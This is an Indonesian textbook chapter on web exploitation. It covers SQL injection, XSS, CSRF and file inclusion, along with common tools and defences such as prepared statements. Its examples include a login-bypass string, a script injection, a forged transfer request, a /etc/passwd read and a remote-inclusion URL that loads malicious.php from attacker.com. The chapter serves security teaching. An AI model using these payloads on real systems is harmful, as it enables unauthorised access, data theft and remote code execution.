# Chapter 3: Web Exploitation

## Apa Itu Web Exploitation?

Web Exploitation adalah proses menemukan dan memanfaatkan kelemahan atau celah keamanan dalam aplikasi web. Celah-celah ini dapat dieksploitasi oleh penyerang untuk mencuri data, merusak sistem, atau mengambil alih kendali dari server yang menjalankan aplikasi. Web exploitation adalah salah satu bidang utama dalam keamanan siber karena banyaknya aplikasi berbasis web yang digunakan di seluruh dunia.

Web exploitation melibatkan pemahaman yang mendalam tentang arsitektur aplikasi web, bahasa pemrograman, dan metode komunikasi di internet, seperti HTTP dan HTTPS.

## Jenis Serangan pada Aplikasi Web

### 1. **SQL Injection (SQLi)**
SQL Injection adalah salah satu teknik serangan yang paling umum, di mana penyerang menyisipkan perintah SQL berbahaya ke dalam input aplikasi web (seperti form pencarian atau login). Jika aplikasi tidak melakukan validasi input dengan baik, perintah tersebut akan dieksekusi oleh database.

#### Contoh:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password';
```
Penyerang bisa memasukkan `' OR '1'='1` di bagian password untuk membuat query seperti ini:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```
Akibatnya, query akan selalu bernilai benar, memberikan akses tidak sah kepada penyerang.

### 2. **Cross-Site Scripting (XSS)**
XSS terjadi ketika aplikasi web menampilkan konten yang berasal dari input pengguna tanpa validasi yang benar. Penyerang bisa menyuntikkan skrip berbahaya (misalnya JavaScript) ke dalam halaman web yang dilihat oleh pengguna lain.

#### Contoh:
Penyerang dapat memasukkan kode JavaScript ke dalam komentar di halaman web:
```html
<script>alert('XSS Attack');</script>
```
Ketika pengguna lain membuka halaman tersebut, skrip berbahaya akan dieksekusi di browser mereka.

### 3. **Cross-Site Request Forgery (CSRF)**
CSRF adalah serangan yang mengeksploitasi kepercayaan sebuah situs terhadap browser pengguna. Penyerang membuat sebuah tautan atau formulir berbahaya yang secara otomatis mengirimkan permintaan ke aplikasi web, seolah-olah berasal dari pengguna sah.

#### Contoh:
Pengguna login ke situs perbankan, dan kemudian membuka halaman lain yang berisi skrip berbahaya yang mengirimkan permintaan transfer uang:
```html
<img src="https://bank.com/transfer?amount=10000&to=attacker_account" />
```
Jika pengguna masih dalam sesi yang valid, perintah transfer akan dieksekusi tanpa sepengetahuan pengguna.

### 4. **File Inclusion**
Serangan file inclusion terjadi ketika aplikasi web memungkinkan pengguna untuk memuat file secara dinamis. Ini bisa mengakibatkan Local File Inclusion (LFI) atau Remote File Inclusion (RFI), di mana penyerang dapat memuat file yang tidak sah dari server lokal atau jarak jauh.

#### Local File Inclusion (LFI)
Penyerang dapat menyisipkan file sistem lokal untuk mengekstrak informasi sensitif:
```php
include($_GET['page']);
```
Jika penyerang mengakses URL seperti ini:
```
http://example.com/index.php?page=/etc/passwd
```
File `/etc/passwd` (yang menyimpan data pengguna) bisa diekspos.

#### Remote File Inclusion (RFI)
Penyerang bisa menyertakan file eksternal yang berisi kode berbahaya:
```php
include($_GET['page']);
```
Penyerang bisa menggunakan URL seperti ini:
```
http://example.com/index.php?page=http://attacker.com/malicious.php
```
File berbahaya dari server penyerang akan dieksekusi oleh aplikasi.

## Proses Web Exploitation

1. **Informasi Awal (Reconnaissance)**
   Penyerang memulai dengan mengumpulkan informasi tentang target, termasuk URL, parameter, dan teknologi yang digunakan aplikasi. Tools seperti **Burp Suite**, **OWASP ZAP**, atau **Nmap** sering digunakan pada tahap ini.

2. **Pemindaian Kelemahan (Vulnerability Scanning)**
   Setelah mendapatkan informasi awal, penyerang akan memindai target untuk menemukan kelemahan, seperti input yang tidak divalidasi atau konfigurasi yang salah. **OWASP ZAP** dan **Nessus** adalah tools yang populer untuk memindai kelemahan aplikasi web.

3. **Eksploitasi Kelemahan**
   Jika kelemahan ditemukan, penyerang akan mencoba mengeksploitasinya. Ini bisa termasuk menjalankan perintah SQL berbahaya, menyuntikkan skrip XSS, atau memanfaatkan kerentanan lain untuk mencuri data atau mengendalikan server.

4. **Post-Exploitation**
   Setelah eksploitasi berhasil, penyerang mungkin melanjutkan dengan aktivitas seperti mencuri data, memasang backdoor, atau mengeksekusi payload berbahaya. Penyerang akan mencoba mempertahankan akses ke sistem target tanpa terdeteksi.

## Alat yang Digunakan untuk Web Exploitation

### 1. **Burp Suite**
   Burp Suite adalah salah satu tools terpopuler untuk pengujian keamanan aplikasi web. Burp Suite memungkinkan pengguna untuk mengintersep dan memodifikasi lalu lintas HTTP, mengotomatisasi pemindaian, dan mengeksploitasi kelemahan aplikasi web.

### 2. **OWASP ZAP**
   OWASP ZAP adalah alat sumber terbuka yang digunakan untuk memindai dan mengeksploitasi kelemahan aplikasi web. Ini sangat populer untuk pengujian penetrasi otomatis dan manual.

### 3. **SQLMap**
   SQLMap adalah tool otomatis untuk mendeteksi dan mengeksploitasi kelemahan SQL Injection di aplikasi web. SQLMap memungkinkan penyerang untuk menyuntikkan perintah SQL dan mengakses database target.

### 4. **Nmap**
   Nmap digunakan untuk pemindaian jaringan dan port. Ini sering digunakan dalam tahap pengumpulan informasi untuk menemukan layanan atau aplikasi yang rentan di jaringan target.

## Cara Melindungi dari Web Exploitation

1. **Validasi Input**
   Semua input pengguna harus divalidasi dan disanitasi sebelum diproses oleh server. Ini mencegah serangan SQL Injection dan XSS.
   
2. **Menggunakan Prepared Statements**
   Untuk mencegah SQL Injection, selalu gunakan *prepared statements* atau *parameterized queries* alih-alih menyusun query SQL secara dinamis.

3. **Token Anti-CSRF**
   Tambahkan token anti-CSRF ke setiap permintaan sensitif (misalnya, formulir) untuk memastikan permintaan datang dari pengguna yang sah.

4. **Konfigurasi Keamanan yang Baik**
   Periksa kembali izin file dan konfigurasi server untuk mencegah serangan LFI dan RFI. Batasi akses ke file sensitif.

5. **Gunakan HTTPS**
   Menggunakan HTTPS akan mengenkripsi data dalam perjalanan, sehingga mengurangi risiko serangan *man-in-the-middle*.

## Studi Kasus Sederhana: SQL Injection

Sebuah aplikasi web memiliki form login sederhana dengan query SQL seperti ini:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```

Penyerang mencoba menyuntikkan input berbahaya di bagian password:
```
' OR '1'='1
```

Query yang dieksekusi menjadi:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```
Karena kondisi `OR '1'='1'` selalu bernilai benar, penyerang mendapatkan akses tidak sah ke aplikasi.

Untuk mencegahnya, developer harus menggunakan *prepared statements*:
```php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username AND password = :password');
$stmt->execute(['username' => $username, 'password' => $password]);
```

## Kesimpulan

Web exploitation adalah area penting dalam keamanan siber yang fokus pada eksploitasi kelemahan di aplikasi web. Dengan pemahaman yang tepat tentang berbagai jenis serangan dan bagaimana cara melindungi aplikasi, kita dapat mengurangi risiko eksploitasi dan melindungi data serta sistem dari ancaman.
